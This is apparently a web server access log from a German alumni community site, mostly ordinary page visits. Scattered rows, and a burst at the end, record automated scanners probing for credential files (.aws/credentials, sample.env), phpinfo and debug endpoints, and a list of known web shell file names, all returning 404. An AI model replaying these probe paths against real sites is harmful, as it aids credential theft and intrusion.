user;timestamp;referer;target;method;status
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-23 23:11:24;/gruppen/interesse/datenanalyse-und-forschung;/personen/alumni/schule/610021;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-23 23:12:47;/gruppen/hobby/ernahrungswissenschaft;/gruppen/hobby/schreinern-und-bauen;GET;302
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-23 23:12:48;/gruppen/hobby/ernahrungswissenschaft;/gruppen;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-23 23:14:11;/gruppen/hobby/ernahrungswissenschaft;/gruppen/hobby/kochen-und-backen;GET;302
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-23 23:14:12;/gruppen/hobby/ernahrungswissenschaft;/gruppen;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-23 23:15:36;/gruppen/hobby/ernahrungswissenschaft;/gruppen/hobby/chemie;GET;302
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-23 23:15:37;/gruppen/hobby/ernahrungswissenschaft;/gruppen;GET;200
87e67cee3db41fadb2a7ee5dc62afdae7a8a176d0c3f97c84188e09f120eed4b;2025-11-23 23:30:48;;/developmentserver/metadatauploader;GET;404
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-23 23:43:34;;/gruppen/interesse/datenanalyse-und-forschung;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-23 23:48:37;;/gruppen/interesse/teamarbeit;GET;200
fe392459a77965c7da68739e371214e5bc8c34a335543b9c91cdb6ed9468ed5f;2025-11-23 23:54:05;;/;GET;200
d9e3e04be2fc547b7b6296031fd7aa5905caba9b91281291d376687bd2b384aa;2025-11-23 23:54:31;;/themen/details/abschied-aus-moabit;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-23 23:56:18;/actuator/gateway/routes;/actuator/gateway/routes;GET;404
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-24 00:06:24;/themen?category=wissenschaft;/themen/details/der-start-ins-studium;GET;200
a8f2c145316b032bfdab21a0f208d2cc6fd3d6f7c4d15498fa00934df568504a;2025-11-24 00:07:30;;/tr/;GET;404
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-24 00:07:54;/gruppen/interesse/datenanalyse-und-forschung;/personen/alumni/schule/5826;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-24 00:10:18;;/themen/details/erfolgreich-durch-die-abiturprufungen;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-24 00:17:28;;/personen/alumni/details/cynthia-ott;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-24 00:17:58;;/personen/alumni/details/andie-jahnke;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-24 00:17:58;;/personen/alumni/details/benjamin-voigt;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-24 00:19:27;;/personen/alumni/details/sami-teuchert;GET;200
bff850e700258985a9e169876a16b3429f5f982f9fdb846ee94248c5140e85c8;2025-11-24 00:41:32;;/;GET;200
0ea4c89e30e34c9638ee01314654b8426f3383ea84300cd20f4497c30452db7c;2025-11-24 00:46:21;;/;GET;200
92c0be6e67d4deab9d764d1d3b8bbbde4a9a5e753c7d48204ae584f567df592d;2025-11-24 00:47:56;;/aktuelles/stellenangebote;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-24 01:03:10;;/themen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
0060e43a392c074d47099dd7d1bc7b6caa1bf2f7f553452a5e061e8000ae72ae;2025-11-24 01:03:58;;/;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-24 01:03:58;;/themen?category=kultur;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-24 01:05:18;;/aktuelles/meldungen?category=wissenschaft;GET;200
d5b448449b4316021963519de5aaabd19cce17c83f591890a4411644a6cc032c;2025-11-24 01:05:24;;/;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-24 01:08:22;;/gruppen/plausch/schulband-statt-fliessband;GET;302
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-24 01:08:23;;/gruppen/hobby/musikinstrumente-spielen;GET;302
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-24 01:08:23;;/gruppen;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-24 01:11:27;;/personen/alumni/details/thomas-matzig;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-24 01:12:16;;/personen/alumni/details/albert-hammig;GET;200
c04408f34a06a975b02ee212bc3d34537df678d11a1a60fad830921024f98bc7;2025-11-24 01:12:22;;/;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-24 01:14:19;;/personen/alumni/details/sebastian-langhorst;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-24 01:14:19;;/personen/alumni/details/dilek-keskin;GET;200
66404f0ed01f304b2c41d402c392067adf0c1f9a83e76a8e63f0a6ccbb664c58;2025-11-24 01:17:43;;/;GET;200
a34a43a71f85b06c4399fb29fc94336e02acbf8ff04b9d119b5a7c7b5a0e6aaa;2025-11-24 01:22:12;;/;GET;200
300cd6273abad8a9b78f0f0dfa00c869278ad3c96815cce8bd0e0dd2c16faf5c;2025-11-24 01:25:43;;/;GET;200
ce5c4092ffa09eb6aa8a9f1b8d5f4a8a86d658908ab5b12ffe3f558153a521d8;2025-11-24 01:27:06;;/;GET;200
d942ac9f8018c58955638f1ebf109778878197fce4872afdae283a1064670f88;2025-11-24 01:27:16;;/;GET;200
0ccda7e526045a09669fe0cea66a6309cb94b7d18e54b0db0e65792e3cef1712;2025-11-24 01:40:03;;/rechtliches/nutzungsbedingungen;GET;200
626581fdfe5ba0954cfd1217fe3946e844572d27a998084956a4fac42a924f23;2025-11-24 01:42:23;;/;GET;200
37f2e1aa805df3be0c22832174e29570eb0cd68fc779532cfccfdaaeba5a129e;2025-11-24 01:43:01;;/pe;GET;404
1da200b13d719a2a3cbe1fb9799cf2713934227ca7eeee0c39de92f292e1cb2b;2025-11-24 01:43:09;;/sitemap.xml;GET;200
0884839760718d1890cc7acb33e872cef5823ac79edd72ce17fd75bd454a312d;2025-11-24 01:43:23;;/config.json;GET;404
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-24 01:50:10;/gruppen/interesse/datenanalyse-und-forschung;/personen/alumni/schule/0348;GET;200
082ae6c440986c9da37dc37bdf3f7e5de58d5bee3b06960debc5298cac480aa2;2025-11-24 01:52:24;/;/;GET;200
3971278e92fb4e3d3a191dfa32c4c345cbf134227df6f4d424d161b591a11c2f;2025-11-24 01:52:40;/sitemap.xml;/sitemap.xml;GET;200
208d6a1d62dba6e01b4be392e4b5d2bd93026a4aa05ac73667a4c69e6e92bd96;2025-11-24 01:54:19;;/;GET;200
208d6a1d62dba6e01b4be392e4b5d2bd93026a4aa05ac73667a4c69e6e92bd96;2025-11-24 01:57:56;;/sitemap.xml;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-24 02:07:03;/gruppen/hobby/ernahrungswissenschaft;/gruppen/interesse/selbststandigkeit;GET;200
6eb58177c1d8b4677e5af38137920d8617a2da7fd20355662a0ecbdbedaca73e;2025-11-24 02:07:04;;/;GET;200
6eb58177c1d8b4677e5af38137920d8617a2da7fd20355662a0ecbdbedaca73e;2025-11-24 02:07:15;/;/;GET;200
3d0294fcb77ccd138ac074d9061ab5a23a679efc80fa163a064e55412033aa5b;2025-11-24 02:09:43;;/docs/img/skGraph.png;GET;404
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-24 02:15:49;;/personen/alumni/details/jana-zenker;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-24 02:16:01;;/personen/alumni/details/benjamin-wagner;GET;200
9adcbeaefe0c3c7fc2e7f530f5457b8ad670b264373c1955836024b5950d6590;2025-11-24 02:20:52;;/;GET;200
6a58c6a91fb60f0738cc53b54578a0741b463f3307f9ba7389d00dc3ce7b058a;2025-11-24 02:36:03;;/;GET;200
bf1f99b67cb1652345080fec2f8168e3ce09eb6668eec4c66437fd5c528805e2;2025-11-24 02:38:27;/veranstaltungen/details/wohnzimmerkonzert;/veranstaltungen/details/wohnzimmerkonzert;GET;200
c4aecd0a9a718feba3b82a50248e5e28409b642e88467cb0cd0f9a80c3c11fa4;2025-11-24 02:44:00;;/;GET;200
14cce232a050c74a6ece4eb9623695853956d43658cb9aa9b84f388fde39025a;2025-11-24 02:47:30;;/;GET;200
14cce232a050c74a6ece4eb9623695853956d43658cb9aa9b84f388fde39025a;2025-11-24 02:47:31;;/sitemap.xml;GET;200
14cce232a050c74a6ece4eb9623695853956d43658cb9aa9b84f388fde39025a;2025-11-24 02:47:32;;/;GET;200
14cce232a050c74a6ece4eb9623695853956d43658cb9aa9b84f388fde39025a;2025-11-24 02:47:32;;/rechtliches/impressum;GET;200
14cce232a050c74a6ece4eb9623695853956d43658cb9aa9b84f388fde39025a;2025-11-24 02:47:33;;/rechtliches/datenschutz;GET;200
14cce232a050c74a6ece4eb9623695853956d43658cb9aa9b84f388fde39025a;2025-11-24 02:47:34;;/rechtliches/nutzungsbedingungen;GET;200
14cce232a050c74a6ece4eb9623695853956d43658cb9aa9b84f388fde39025a;2025-11-24 02:47:35;;/about/allgemein;GET;200
14cce232a050c74a6ece4eb9623695853956d43658cb9aa9b84f388fde39025a;2025-11-24 02:47:36;;/aktuelles/stellenangebote;GET;200
14cce232a050c74a6ece4eb9623695853956d43658cb9aa9b84f388fde39025a;2025-11-24 02:47:37;;/login;GET;200
14cce232a050c74a6ece4eb9623695853956d43658cb9aa9b84f388fde39025a;2025-11-24 02:47:38;;/profile;GET;302
14cce232a050c74a6ece4eb9623695853956d43658cb9aa9b84f388fde39025a;2025-11-24 02:47:39;;/personen;GET;200
14cce232a050c74a6ece4eb9623695853956d43658cb9aa9b84f388fde39025a;2025-11-24 02:47:40;;/gruppen;GET;200
14cce232a050c74a6ece4eb9623695853956d43658cb9aa9b84f388fde39025a;2025-11-24 02:47:41;;/llms.txt;GET;404
14cce232a050c74a6ece4eb9623695853956d43658cb9aa9b84f388fde39025a;2025-11-24 02:47:41;;/humans.txt;GET;404
14cce232a050c74a6ece4eb9623695853956d43658cb9aa9b84f388fde39025a;2025-11-24 02:47:42;;/ads.txt;GET;404
14cce232a050c74a6ece4eb9623695853956d43658cb9aa9b84f388fde39025a;2025-11-24 02:47:42;;/security.txt;GET;404
14cce232a050c74a6ece4eb9623695853956d43658cb9aa9b84f388fde39025a;2025-11-24 02:47:42;;/.well-known/security.txt;GET;404
14cce232a050c74a6ece4eb9623695853956d43658cb9aa9b84f388fde39025a;2025-11-24 02:47:43;;/;GET;200
05783a182569c23c7ac84723b89765f4708eff14339564ed4e6653b8dfd7c0e8;2025-11-24 02:47:52;;/;GET;200
05783a182569c23c7ac84723b89765f4708eff14339564ed4e6653b8dfd7c0e8;2025-11-24 02:47:55;;/;GET;200
05783a182569c23c7ac84723b89765f4708eff14339564ed4e6653b8dfd7c0e8;2025-11-24 02:47:56;;/;OPTIONS;405
7bfb94afd1579339a4f645f3ecd5f72367e4b235901ac11796cc049a6fb056a1;2025-11-24 02:58:33;;/;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-24 03:12:07;/gruppen/interesse/datenanalyse-und-forschung;/personen/alumni/schule/9001;GET;200
ac31ef424654089952fbc77ef91c737bb147e77a0cb212957b14b8ac42598641;2025-11-24 03:12:26;;/;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-24 03:13:32;/gruppen/hobby/ernahrungswissenschaft;/gruppen/hobby/nahen-und-textilarbeiten;GET;302
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-24 03:13:35;/gruppen/hobby/ernahrungswissenschaft;/gruppen;GET;200
0bd9e4a9e2824deeed092b7c98b92ee543016fb21d99e3bae6d372b32d24c7b6;2025-11-24 03:14:32;;/+CSCOE+/logon.html;GET;404
f5c832cc3b3b7d1f61312c1e01fb17420098264f6defb6f0cca883c930410337;2025-11-24 03:16:11;;/sign-in;GET;404
dc5d2e06ce579c21950ab80c7fc14f491cafce785c22f071e71f2a4ff43c059a;2025-11-24 03:17:45;;/themen/details/abschied-aus-moabit;GET;200
b15fbb64b054b9099bc39d303e15731a3e8b928dd20afab2e72fa6b9d8bacabc;2025-11-24 03:24:24;;/?page=docs-MA1-zahlen.md;GET;200
fcdc1dc9178c9bd5e8129768aa9ef1d0aa94f358f60ebd5c0848c954f85ba74b;2025-11-24 03:29:13;;/;GET;200
d487a9c728e6d8eb50d8f3d6dd557df30fb31d6f9ca5c3a69151a83677af38ce;2025-11-24 03:32:36;/;/;GET;200
18a33cd8212145ed80ec1f3edf7ada0f63248c900bda0d8836447b0cb0ae67fe;2025-11-24 03:36:11;;/personen;GET;200
95adb14617c2c2d58e416757323074db7d92427d72e5785afd85827df32dc46f;2025-11-24 03:36:16;;/gruppen/hobby/ernahrungswissenschaft;GET;302
95adb14617c2c2d58e416757323074db7d92427d72e5785afd85827df32dc46f;2025-11-24 03:36:17;;/gruppen;GET;200
9b7086b19e3383668f6cc3d6359c8aa843fa203412cbac8af0287b225954ef16;2025-11-24 03:39:18;;/;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-24 03:46:43;/gruppen/interesse/datenanalyse-und-forschung;/personen/alumni/schule/183052;GET;200
0de2f958718a9b9718882e6c0c9c9c450e0f0fe0505392332b13c46b35000648;2025-11-24 03:48:17;;/;GET;200
4a2a3c1197a2d4e44ec95adb939f8adba1a37698ede2bd1d39177424a1f113e4;2025-11-24 03:56:51;;/aktuelles/stellenangebote;GET;200
c5549d218fe11699ff2a8127c67bf4a4de7cd8b5ae089d8ccba4aad2516c428a;2025-11-24 04:03:32;;/;GET;200
03e84a370cd3c57dd019628bff8d0c70f2e0d36c44daecf213c5b89fdf04de8a;2025-11-24 04:03:39;;/;GET;200
fae72c50f36f3280d33aea59f81473f18a74be7ab0e96c4d98743b7a229958e7;2025-11-24 04:03:51;;/owa/auth/x.js;GET;404
08530fb0cfc34f253666b6f462d33fe889e14ff3043f37d144ebb821ee994aa5;2025-11-24 04:05:19;;/docs/img/flowchart_01.png;GET;404
03e84a370cd3c57dd019628bff8d0c70f2e0d36c44daecf213c5b89fdf04de8a;2025-11-24 04:08:05;;/webui/;GET;404
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-24 04:08:10;/gruppen/interesse/datenanalyse-und-forschung;/personen/alumni/schule/59043;GET;200
0afa02b8904ddd3cbc48314b53987a4dea0abf215edc67498edae07246efd627;2025-11-24 04:11:18;;/;GET;200
332ba7a92405cc263d9b6d575c96519d7339b45804c7ead6688993d086fbe061;2025-11-24 04:13:11;;/;GET;200
898dadbe3663b29c0519ce0b36d243c0f5c2d51ea43962ac7b1b9bdda4c25f35;2025-11-24 04:27:45;;/;GET;200
03e84a370cd3c57dd019628bff8d0c70f2e0d36c44daecf213c5b89fdf04de8a;2025-11-24 04:32:14;;/geoserver/web/;GET;404
60ea422e2ffb9dd80e130be7b788efa4eece5023b25fdda9e6d5f41074b194c9;2025-11-24 04:48:23;;/;GET;200
60ea422e2ffb9dd80e130be7b788efa4eece5023b25fdda9e6d5f41074b194c9;2025-11-24 04:49:41;;/;GET;200
60ea422e2ffb9dd80e130be7b788efa4eece5023b25fdda9e6d5f41074b194c9;2025-11-24 04:51:42;;/;GET;200
02d71a0287b0a04e5e2651da37d8f6f628f6c771d5e1eb2c2344c4bd6dad3388;2025-11-24 04:51:44;;/themen/details/abschied-aus-moabit;GET;200
4417430b7959de67733db348974fda22a28fab16a58cd3ea989d39653c1dd3d8;2025-11-24 04:53:52;;/;GET;200
15b572aa86215eabf3071f39fa5a2a99309e8cbd18a1b33cb3990239c0e35430;2025-11-24 04:53:58;;/rechtliches/nutzungsbedingungen;GET;200
3acf62c7ed25ee5a6167e95d72c30416c1dec0dd95c5191cf988b684ffd58101;2025-11-24 05:03:31;;/app_dev.php/_profiler/phpinfo;GET;404
3acf62c7ed25ee5a6167e95d72c30416c1dec0dd95c5191cf988b684ffd58101;2025-11-24 05:03:32;;/?phpinfo=-1;GET;200
3acf62c7ed25ee5a6167e95d72c30416c1dec0dd95c5191cf988b684ffd58101;2025-11-24 05:03:37;;/credentials;GET;404
3acf62c7ed25ee5a6167e95d72c30416c1dec0dd95c5191cf988b684ffd58101;2025-11-24 05:03:38;;/sample.env;GET;404
c7f9f8cb140b5b79281d613260034446cd2e7ec91866d8b3a60f5c0e4f131703;2025-11-24 05:03:56;;/;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-24 05:10:51;/gruppen/interesse/datenanalyse-und-forschung;/gruppen;GET;200
11f6974f8fff06d3a2d96d89c0c3365e9a6f9737a3454e2f3ce8d5705e42c12f;2025-11-24 05:17:39;/;/;GET;200
03dd757cda546f986acffacb9a274bfb6c76fdb3dc671ff0750a3d1b6c7f86e4;2025-11-24 05:29:40;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
b72534189eb647c29caa91dbf4930859c0570150900728712d00221b7d0165d1;2025-11-24 05:47:08;;/themen/details/der-start-ins-studium;GET;200
bd70ade6270a6fb71b285a4cd6cf47e453d146d6d81e2d513cc1a71ffdad5954;2025-11-24 05:57:05;;/;GET;200
64c3ef438676e5fa8822188a2970e6138f7682521a3735c53a6f27c98a895b6b;2025-11-24 06:07:57;;/;GET;200
ea3f3fc3a0a25309f88f08b5e7cd8a14a507588f53cdb0d73210fe8ba144e1cc;2025-11-24 06:15:12;;/.aws/credentials;GET;404
e42a0e5ba1f8a3fed820a35f8d5be552f641cbd620ce0c979b56eca1afc2d671;2025-11-24 06:17:45;/media/system/js/core.js;/media/system/js/core.js;GET;404
e42a0e5ba1f8a3fed820a35f8d5be552f641cbd620ce0c979b56eca1afc2d671;2025-11-24 06:17:46;/wp-includes/js/jquery/jquery.js;/wp-includes/js/jquery/jquery.js;GET;404
9e4b638d922c445d6f6e6b678cb8638422143a6d021cf45ba3c8d747cd9e1d47;2025-11-24 06:29:24;;/;GET;200
7857064598c1580395c6725c5bb4e94d1cba28a77198148d3af4c130513c58f3;2025-11-24 06:34:39;;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-24 06:35:55;;/?XDEBUG_SESSION_START=phpstorm;GET;200
2824c54f4a8308626d07165e59adc8df7c3cff9bfe5668e4a6020c80f48db463;2025-11-24 06:37:46;/;/;GET;200
be38b96435f9f356e1d63726c477013b15b6199023d4c44c9ecf597e03009b42;2025-11-24 06:40:29;;/;GET;200
1e82d7b6c7bf93f626027c823661265b8aa1a0c01ac666f87ce29ec369814c75;2025-11-24 06:45:16;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
3e3a8ad9f1a44371e987070dcd4ec25a96ad9ecfac8ab080d47c7b557f83c518;2025-11-24 06:45:51;;/;GET;200
be38b96435f9f356e1d63726c477013b15b6199023d4c44c9ecf597e03009b42;2025-11-24 06:48:33;;/;GET;200
3f594231ac9ac14aca965dfb292bca02a19e8714f935ccb862b705dacaafd967;2025-11-24 06:57:03;;/;GET;200
454fba3d164e9523af3a18767dca1c53608107c85b6618320f6ec5acbf45fc23;2025-11-24 07:07:25;;/;GET;200
1db4a485b7ef884bf67e0c264ca782666cf4aa2c8def51a763cc2ff27c283a05;2025-11-24 07:19:10;;/;GET;200
cdfa80ebf23f2ad70799d5a47c036e4bdc4ea74ff325c98266e3663e2a83c7a8;2025-11-24 07:26:26;/personen/all/4;/personen/all/4;GET;200
ede14e5ea099b433da4e54e4c4db962ef8787f7df96cc6a9ef6aac6972a7e752;2025-11-24 07:30:00;;/;GET;200
606faac6bc14f740d19fe146cc14e609103a73a4acc4e8812a579b6987500e83;2025-11-24 07:35:43;/;/;GET;200
d0aa8f7f6e6097c7363b1fd447c5f192c258b35f9f1f66fbffad1f86c59029a7;2025-11-24 07:37:58;;/aktuelles/stellenangebote;GET;200
58e125ccd5921b0f2eef85c5f0bd8b7a37b14ce4c66c985ef23e482a9b06e4b3;2025-11-24 07:39:46;;/;GET;200
db80b4f06eda1d90ed3cf74cc5486b8cadfc8df2d3468523ebdf1055f08e0712;2025-11-24 07:44:33;;/;GET;200
bb378c80b7ea87ef9cefb6a093c199c8c2a386d94f261764999733993c2ff59a;2025-11-24 07:49:24;;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-24 07:53:47;;/actuator/gateway/routes;GET;404
fd4f83800bc910a053eebcf4966c47261b22ec225a3eb7e4d227b3c8d1690898;2025-11-24 07:55:15;;/personen/alumni/details/johanna-schley;GET;200
bbdd67f67647ee1d7a290d3e988d352a45013556fbc309280fc757393da60b4b;2025-11-24 08:02:46;;/;GET;200
d9bec6cab084b4235de8f09e4410dc7115977a3d4e0984541856f745ea76591e;2025-11-24 08:07:35;;/;GET;200
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:09;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:10;;/shoha.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:10;;/yyy.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:12;;/ooj.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:14;;/0.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:15;;/x3.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:15;;/hzz.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:16;;/dom.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:16;;/dds.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:18;;/gg.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:20;;/past.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:21;;/class-db.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:21;;/bq.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:21;;/tro.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:22;;/lov.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:22;;/wsz.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:22;;/73106.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:23;;/nas.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:24;;/acp.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:24;;/aol7.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:25;;/wui.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:25;;/wp-admin/new2.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:29;;/poj.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:29;;/log.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:30;;/zoro.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:30;;/ker.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:30;;/aaa.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:30;;/efa4f.php;GET;404
801002c876cbd918513154af0e5762bdeed2cdbf126c402ffe61be460d6ce257;2025-11-24 08:08:31;;/a2.php;GET;404
